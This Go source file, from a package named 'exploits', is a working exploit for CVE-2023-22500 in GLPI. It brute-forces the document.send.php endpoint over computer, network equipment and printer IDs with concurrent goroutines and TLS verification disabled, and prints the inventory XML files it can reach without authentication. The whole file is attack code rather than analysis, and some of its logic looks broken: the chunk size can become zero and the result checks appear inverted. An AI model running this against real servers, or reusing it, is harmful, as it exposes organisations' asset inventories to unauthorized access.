package exploits

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
)

/*

POC UNIQUEMENT SI unauth
GEN doss GLPI :
computer/x/0-999 if 1000 alors x=1
networkequipment/x/0-999 if 1000 alors x=1
printer/x/0-999 if 1000 alors x=1
*/
// 						resp, err := http.Get(target + "/front/document.send.php?file=_inventory/" + itemtype + "/0/" + strconv.Itoa(id) + ".xml")
var itemtypes = []string{"computer", "networkequipment", "printer"}

func CVE202322500(target string, numRoutines string) {
	if CheckCVE202322500(target) {

		numRoutines, err := strconv.Atoi(numRoutines)
		if err != nil {
			fmt.Println("Error:", err)
			os.Exit(1)
		}

		ids := make([]int, 1000)
		for i := 0; i < 1000; i++ {
			ids[i] = i
		}

		var wg sync.WaitGroup
		var mu sync.Mutex
		count := 0

		chunkSize := 10 / numRoutines
		for _, itemtype := range itemtypes {
			for i := 0; i < len(ids); i += chunkSize {
				wg.Add(1)
				go func(ids []int) {
					defer wg.Done()
					for _, id := range ids {
						client := &http.Client{
							Transport: &http.Transport{
								TLSClientConfig: &tls.Config{
									InsecureSkipVerify: true,
								},
							},
						}
						resp, err := client.Get(target + "/front/document.send.php?file=_inventory/" + itemtype + "/0/" + strconv.Itoa(id) + ".xml")
						if err != nil {
							fmt.Println("Error while doing request")
						}

						defer resp.Body.Close()
						body, err := io.ReadAll(resp.Body)
						if err != nil {
							fmt.Println("Error while reading the response:", err)
						}
						bodystr := string(body)

						if !strings.Contains(bodystr, "Unauthorized Access to this File") {
							fmt.Println("Nothing !!!!")
							mu.Lock()
							count++
							mu.Unlock()
							if count >= 50 {
								return
							}
						} else {
							fmt.Println(target + "/front/document.send.php?file=_inventory/" + itemtype + "/0/" + strconv.Itoa(id) + ".xml")
							mu.Lock()
							count = 0
							mu.Unlock()
						}

					}
				}(ids[i:min(i+chunkSize, len(ids))])
			}

			wg.Wait()
			if count >= 50 {
				break
			}
		}
	}

}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
